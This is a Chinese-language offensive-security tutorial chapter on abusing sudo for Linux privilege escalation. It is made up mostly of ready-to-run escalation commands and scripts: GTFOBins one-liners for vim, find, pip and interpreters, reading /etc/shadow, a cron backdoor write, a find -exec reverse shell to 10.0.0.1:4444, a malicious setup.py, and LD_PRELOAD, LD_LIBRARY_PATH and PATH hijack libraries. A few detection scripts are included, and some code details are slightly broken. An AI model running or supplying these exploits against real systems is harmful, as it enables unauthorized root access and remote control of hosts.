# sudo滥用：GTFOBins自动化

## 章节概述

sudo 是 Linux 系统中最常见的权限提升机制，通过 `/etc/sudoers` 文件配置，允许特定用户以 root 身份执行特定命令。当 sudoers 配置不当或存在已知可利用的 sudo 允许命令时，攻击者可以借此提升至 root 权限。本章深入讲解 sudo 权限分析、GTFOBins 自动化查询、常见 sudo 提权手法（vim/nano/find/pip）、环境变量提权以及 LD_PRELOAD 劫持技术。

> **核心理念**
> sudo 提权的核心在于"被允许执行的命令"本身可以被滥用。GTFOBins 提供了上百种已知的利用路径，自动化查询和匹配是红队效率的关键。防御端则需要遵循最小权限原则，精确控制每个用户的 sudo 权限。

---

### 第1节 sudo -l 分析基础

#### 1.1 查看当前用户 sudo 权限

```bash
# 查看当前用户的 sudo 权限
sudo -l

# 典型输出解读:
# (root) NOPASSWD: /usr/bin/find
#   -> 用户可以无密码以 root 执行 find
# (root) /usr/bin/vim /etc/anything
#   -> 用户需要密码才能以 root 执行 vim，且只能编辑 /etc/anything
# (app) ALL = (root) ALL
#   -> 用户可以以 root 执行任何命令（但需要密码）

# 以其他用户身份查看 sudo 权限
sudo -l -U target_user
```

#### 1.2 sudoers 文件结构解析

```bash
# 查看 sudoers 文件（需要 root 权限）
cat /etc/sudoers

# 或查看 sudoers.d 目录下的配置
ls -la /etc/sudoers.d/

# sudoers 格式:
# User_Alias ADMINS = user1, user2, user3
# Cmnd_Alias SHELLS = /bin/bash, /bin/sh, /bin/zsh
# root    ALL=(ALL:ALL) ALL
# %sudo   ALL=(ALL:ALL) ALL
# user1   ALL=(root) /usr/bin/vim
# user2   ALL=(root) NOPASSWD: /usr/bin/find
```

#### 1.3 环境变量在 sudo 中的行为

```bash
# sudo 默认会清理大多数环境变量
# 但保留以下变量:
# HOME, MAIL, LOGNAME, USER, USERNAME, SUDO_*

# 检查 sudo 保留的环境变量
sudo env | grep -E "^(HOME|MAIL|LOGNAME|USER|USERNAME|SUDO_)"

# 如果 sudoers 中配置了 !ENV_RESET 或 env_keep，则更多变量会保留
# 这是环境变量提权的基础

# 使用 sudo -V 查看 sudo 版本和配置
sudo -V
```

---

### 第2节 GTFOBins 自动化查询脚本

#### 2.1 GTFOBins 数据库下载与管理

```bash
#!/usr/bin/env bash
# gtfo_manager.sh - GTFOBins 数据库管理工具
set -euo pipefail

GTFOBINS_DIR="/opt/gtfobins"
GTFOBINS_REPO="https://github.com/GTFOBins/GTFOBins.github.io.git"

clone_gtfobins() {
    if [[ -d "$GTFOBINS_DIR" ]]; then
        echo "[*] GTFOBins 已存在于 $GTFOBINS_DIR"
        echo "[*] 更新中..."
        git -C "$GTFOBINS_DIR" pull
    else
        echo "[*] 正在克隆 GTFOBins 数据库..."
        git clone "$GTFOBINS_REPO" "$GTFOBINS_DIR"
    fi
    echo "[+] GTFOBins 数据库就绪"
}

query_binary() {
    local binary_name="${1:?用法: $0 query <二进制文件名>}"
    local gtfobins_file="$GTFOBINS_DIR/_gtfobins/${binary_name}.md"

    if [[ ! -f "$gtfobins_file" ]]; then
        echo "[-] 未找到 $binary_name 的 GTFOBins 条目"
        return 1
    fi

    echo "===== GTFOBins: $binary_name ====="
    echo ""

    if grep -q "SUID" "$gtfobins_file"; then
        echo "[!] 可用于 SUID 提权:"
        awk '/^## SUID/,/^## [^S]/' "$gtfobins_file" | head -20
        echo ""
    fi

    if grep -q "sudo" "$gtfobins_file"; then
        echo "[!] 可用于 sudo 提权:"
        awk '/^## sudo/,/^## [^s]/' "$gtfobins_file" | head -20
        echo ""
    fi

    if grep -q "Limited" "$gtfobins_file"; then
        echo "[!] Limited SUID 利用:"
        awk '/^## Limited/,/^## [^L]/' "$gtfobins_file" | head -15
    fi
}

scan_sudo_for_exploits() {
    echo "[*] 分析 sudo -l 输出并匹配 GTFOBins..."

    local sudo_output
    sudo_output=$(sudo -l 2>/dev/null) || {
        echo "[-] 无法获取 sudo -l 输出（需要密码或权限不足）"
        return 1
    }

    local commands
    commands=$(echo "$sudo_output" | grep -oP '(?<=NOPASSWD: |PASSWD: )\S+' | sort -u)

    if [[ -z "$commands" ]]; then
        echo "[-] 未发现可利用的 sudo 命令"
        return
    fi

    while IFS= read -r cmd; do
        local basename_cmd
        basename_cmd=$(basename "$cmd")
        echo ""
        echo "[*] 检查命令: $cmd"
        query_binary "$basename_cmd" 2>/dev/null && continue
        echo "    -> GTFOBins 中未找到利用方法"
    done <<< "$commands"
}

main() {
    local action="${1:-help}"
    case "$action" in
        install)  clone_gtfobins ;;
        query)    query_binary "${2:-}" ;;
        scan)     scan_sudo_for_exploits ;;
        *)        echo "用法: $0 {install|query <binary>|scan}" ;;
    esac
}

main "$@"
```

#### 2.2 实时 GTFOBins 在线查询

```bash
#!/usr/bin/env bash
# gtfo_online.sh - 在线查询 GTFOBins
set -euo pipefail

BINARY_NAME="${1:?用法: $0 <二进制文件名>}"

echo "[*] 在线查询 GTFOBins: $BINARY_NAME"

response=$(curl -s -o /dev/null -w "%{http_code}" \
    "https://gtfobins.github.io/gtfobins/${BINARY_NAME}/")

if [[ "$response" == "200" ]]; then
    echo "[+] 找到条目，获取利用方法..."
    echo ""
    echo "===== SUID 提权 ====="
    curl -s "https://gtfobins.github.io/gtfobins/${BINARY_NAME}/" | \
        sed -n '/<h2 id="suid">/,/<h2 id="/p' | \
        sed 's/<[^>]*>//g' | head -20
    echo ""
    echo "===== sudo 提权 ====="
    curl -s "https://gtfobins.github.io/gtfobins/${BINARY_NAME}/" | \
        sed -n '/<h2 id="sudo">/,/<h2 id="/p' | \
        sed 's/<[^>]*>//g' | head -20
else
    echo "[-] GTFOBins 中未找到 $binary_name 的条目"
fi
```

---

### 第3节 常见 sudo 提权利用

#### 3.1 vim/nano 提权

```bash
# vim 提权 - 如果 sudo 允许执行 vim，可以读写任意文件

# 方法1: 读取文件
sudo vim -c ':read /etc/shadow'

# 方法2: 写入文件
sudo vim -c ':write /etc/cron.d/backdoor' -c ':quit'

# 方法3: 执行 shell
sudo vim -c ':!/bin/sh'

# 方法4: 使用 vim 的 terminal 功能（vim 8.2+）
sudo vim -c ':terminal /bin/sh'

# nano 提权 - nano 的权限较低，但仍可利用
sudo nano /etc/shadow
# nano 编辑器中按 Ctrl+R, 然后按 Ctrl+X 执行命令
```

#### 3.2 find 提权

```bash
# find 的 -exec 参数可以执行任意命令

sudo find /tmp -exec /bin/sh -p \;
sudo find /etc/shadow -exec cat {} \;
sudo find /tmp -exec touch /tmp/pwned \; -quit
sudo find /tmp -exec bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1' \;
```

#### 3.3 pip 提权

```bash
# pip 可以通过 --upgrade-strategy 或安装恶意包来提权

sudo pip install --upgrade pip

# 通过 pip 的 setup.py 执行代码
cat > /tmp/setup.py << 'PYEOF'
from setuptools import setup
import os
os.system('/bin/sh')
setup(
    name='pwn',
    version='0.1',
    description='Pwn',
    author='attacker',
    author_email='attacker@evil.com',
    url='http://evil.com',
)
PYEOF

sudo pip install /tmp/setup.py
```

#### 3.4 awk/perl/ruby/python 提权

```bash
# awk 提权
sudo awk 'BEGIN {system("/bin/sh")}'

# perl 提权
sudo perl -e 'exec "/bin/sh";'

# ruby 提权
sudo ruby -e 'exec "/bin/sh"'

# python 提权
sudo python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
sudo python3 -c 'import os; os.execl("/bin/sh", "sh", "-p")'

# node 提权
sudo node -e 'require("child_process").spawn("/bin/sh", {stdio: [0,1,2]})'
```

#### 3.5 env 提权

```bash
# env 可以执行任意命令
sudo env /bin/sh -p

# 或者通过环境变量注入
sudo env LD_PRELOAD=/tmp/malicious.so /bin/true
```

---

### 第4节 环境变量提权

#### 4.1 LD_PRELOAD 劫持

```bash
#!/usr/bin/env bash
# ld_preload_exploit.sh - LD_PRELOAD 提权利用

# 前提条件: sudoers 中有 env_keep+=LD_PRELOAD 或 !env_reset

# 1. 创建恶意共享库
cat > /tmp/pwn.c << 'EOF'
#define _GNU_SOURCE
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setresuid(0, 0, 0);
    setresgid(0, 0, 0);
    system("/bin/sh");
}
EOF

# 2. 编译共享库
gcc -fPIC -shared -nostartfiles -o /tmp/pwn.so /tmp/pwn.c

# 3. 设置环境变量并执行 sudo 命令
export LD_PRELOAD=/tmp/pwn.so
sudo /usr/bin/vim
```

#### 4.2 LD_LIBRARY_PATH 劫持

```bash
#!/usr/bin/env bash
# ld_library_path_exploit.sh - LD_LIBRARY_PATH 提权

# 1. 查看目标程序的依赖
ldd /usr/bin/target_program

# 2. 创建恶意共享库
cat > /tmp/libfoo.c << 'EOF'
#include <stdio.h>
#include <unistd.h>

__attribute__((constructor))
void init(void) {
    unsetenv("LD_LIBRARY_PATH");
    system("/bin/sh");
}
EOF

# 3. 编译为同名共享库
gcc -shared -o /tmp/libfoo.so.1 /tmp/libfoo.c

# 4. 劫持库路径
export LD_LIBRARY_PATH=/tmp
sudo /usr/bin/target_program
```

#### 4.3 PATH 劫持

```bash
#!/usr/bin/env bash
# path_exploit.sh - PATH 环境变量提权

# 如果 sudo 配置了 !secure_path 或 env_keep+=PATH

cat > /tmp/ls << 'EOF'
#!/bin/bash
/bin/sh -p
EOF
chmod +x /tmp/ls

export PATH=/tmp:$PATH
sudo ls
```

#### 4.4 检测和利用环境变量 sudo

```bash
#!/usr/bin/env bash
# env_check.sh - 检查 sudo 环境变量配置

echo "[*] 检查 sudo 环境变量配置..."

if sudo -V 2>/dev/null | grep -q "env_keep"; then
    echo "[!] 发现 env_keep 配置:"
    sudo -V | grep "env_keep"
fi

if grep -q "!env_reset" /etc/sudoers 2>/dev/null; then
    echo "[!] env_reset 已禁用 - 环境变量未被清理"
fi

echo "[*] 测试 sudo 环境变量传递..."
sudo env 2>/dev/null | grep -E "^(LD_|PATH)" && {
    echo "[!] 可能存在环境变量劫持风险"
}
```

---

### 第5节 LD_PRELOAD 深入利用

#### 5.1 完整的 LD_PRELOAD 攻击链

```bash
#!/usr/bin/env bash
# ld_preload_chain.sh - 完整 LD_PRELOAD 攻击链
set -euo pipefail

ATTACKER_IP="${1:?用法: $0 <攻击者IP>}"
ATTACKER_PORT="${2:-4444}"

echo "[*] === LD_PRELOAD 提权攻击 ==="

# 步骤1: 创建共享库（本地 shell 版本）
cat > /tmp/shell.c << 'SHELLEOF'
#define _GNU_SOURCE
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>

__attribute__((constructor))
void init(void) {
    unsetenv("LD_PRELOAD");
    setresuid(0, 0, 0);
    setresgid(0, 0, 0);
    system("/bin/sh");
}
SHELLEOF

# 步骤2: 编译
echo "[*] 编译共享库..."
gcc -fPIC -shared -nostartfiles -o /tmp/shell.so /tmp/shell.c -w

# 步骤3: 设置环境并执行
echo "[*] 执行攻击..."
export LD_PRELOAD=/tmp/shell.so
sudo /usr/bin/vim 2>/dev/null || sudo /usr/bin/find /tmp -exec /bin/sh \;
```

#### 5.2 LD_PRELOAD 防御检测

```bash
#!/usr/bin/env bash
# ld_preload_defense.sh - LD_PRELOAD 攻击检测
set -euo pipefail

echo "[*] 检查 LD_PRELOAD 攻击面..."

if [[ -n "${LD_PRELOAD:-}" ]]; then
    echo "[!] LD_PRELOAD 已设置: $LD_PRELOAD"
fi

if [[ -f /etc/ld.so.preload ]]; then
    echo "[!] /etc/ld.so.preload 存在，内容:"
    cat /etc/ld.so.preload
fi

if sudo -V 2>/dev/null | grep -q "LD_PRELOAD"; then
    echo "[!] sudo env_keep 包含 LD_PRELOAD - 高风险!"
fi

if grep -q '!env_reset' /etc/sudoers 2>/dev/null; then
    echo "[!] sudo env_reset 已禁用 - 环境变量未清理"
fi

echo "[*] 测试动态链接器行为..."
LD_DEBUG=libs ls /dev/null 2>&1 | head -5
```

---

### 第6节 自动化 sudo 提权扫描

#### 6.1 完整的 sudo 提权扫描器

```bash
#!/usr/bin/env bash
# sudo_privesc_scanner.sh - sudo 提权自动化扫描器
set -euo pipefail

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

log_info()  { echo -e "${CYAN}[*]${NC} $*"; }
log_found() { echo -e "${RED}[!]${NC} $*"; }
log_safe()  { echo -e "${GREEN}[+]${NC} $*"; }
log_warn()  { echo -e "${YELLOW}[~]${NC} $*"; }

declare -A GTFOBINS_DB=(
    ["find"]="sudo find . -exec /bin/sh -p \;"
    ["vim"]="sudo vim -c ':!/bin/sh'"
    ["vi"]="sudo vi -c ':!/bin/sh'"
    ["nano"]="sudo nano (Ctrl+R, Ctrl+X)"
    ["nmap"]="echo script execution via nmap"
    ["less"]="sudo less /etc/passwd (然后 !sh)"
    ["more"]="sudo more /etc/passwd (然后 !sh)"
    ["man"]="sudo man man (然后 !sh)"
    ["awk"]="sudo awk system call"
    ["perl"]="sudo perl exec shell"
    ["ruby"]="ruby exec shell"
    ["python"]="python os.execl shell"
    ["python3"]="python3 os.execl shell"
    ["env"]="sudo env /bin/sh -p"
    ["pip"]="sudo pip install"
    ["wget"]="sudo wget post file"
    ["curl"]="sudo curl file protocol"
    ["bash"]="sudo bash -p"
    ["sh"]="sudo sh"
)

scan_sudo_permissions() {
    log_info "扫描 sudo 权限配置..."

    local sudo_output
    sudo_output=$(sudo -l 2>/dev/null) || {
        log_warn "无法获取 sudo -l 输出"
        return 1
    }

    echo "$sudo_output" | while IFS= read -r line; do
        if echo "$line" | grep -qE "(ALL|NOPASSWD|PASSWD)"; then
            log_found "sudo 规则: $line"

            local cmd
            cmd=$(echo "$line" | grep -oP '\S+$' | head -1)
            local base
            base=$(basename "$cmd")

            if [[ -v "GTFOBINS_DB[$base]" ]]; then
                log_found "  -> 已知可利用! 利用方法: ${GTFOBINS_DB[$base]}"
            fi
        fi
    done
}

check_env_keep() {
    log_info "检查 sudo 环境变量保留配置..."

    if sudo -V 2>/dev/null | grep -q "env_keep"; then
        local env_keep
        env_keep=$(sudo -V 2>/dev/null | grep "env_keep")
        log_warn "发现环境变量保留: $env_keep"

        if echo "$env_keep" | grep -q "LD_PRELOAD"; then
            log_found "LD_PRELOAD 被保留 - 可进行 LD_PRELOAD 攻击!"
        fi
        if echo "$env_keep" | grep -q "LD_LIBRARY_PATH"; then
            log_found "LD_LIBRARY_PATH 被保留 - 可进行库劫持!"
        fi
        if echo "$env_keep" | grep -q "PATH"; then
            log_warn "PATH 被保留 - 可能存在 PATH 劫持风险"
        fi
    fi
}

main() {
    echo "====================================="
    echo "  sudo 提权扫描器 v1.0"
    echo "====================================="

    scan_sudo_permissions
    echo ""
    check_env_keep

    echo ""
    log_info "扫描完成"
}

main "$@"
```
